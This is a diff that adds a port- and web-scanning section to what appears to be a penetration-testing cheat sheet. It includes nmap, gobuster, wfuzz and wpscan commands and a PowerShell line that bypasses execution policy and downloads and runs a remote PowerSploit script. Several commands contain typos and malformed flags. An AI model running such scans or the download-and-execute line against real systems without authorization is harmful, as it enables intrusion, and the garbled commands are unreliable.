@@ -17,6 +17,45 @@
   - [Enumeration](#enumeration)
     - [Powerview](#powerview)
    
+# Initial Access 
+
+## Enumeration
+
+### Port Scan
+```bash
+#namp
+nmap -sS -Pn -n -Ax.x.x.x
+nmap -SU -p- -- max-retries 0 -min-rate 500 x.x.x.x
+
+#powershell's port scan
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts x.x.x.x"
+```
+### Web scan
+```bash
+#Nikto
+nikto -h x.x.x.x
+
+#Gobuster
+gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20
+gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20
+gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt-t 20 -x .txt,.php
+
+#Wfuzz
+wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
+wfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -- hc 400,404,500 http://x.x.x.x/FUZZ
+
+#cmsmap
+cmsmap.py https://x.x.x.x
+
+#wpscan
+wpscan -url https://x.x.x.x
+```
+
+###SMB Enumeration
+
+
+
+   
 # Active Directory Pentesting
 
 ## Enumeration
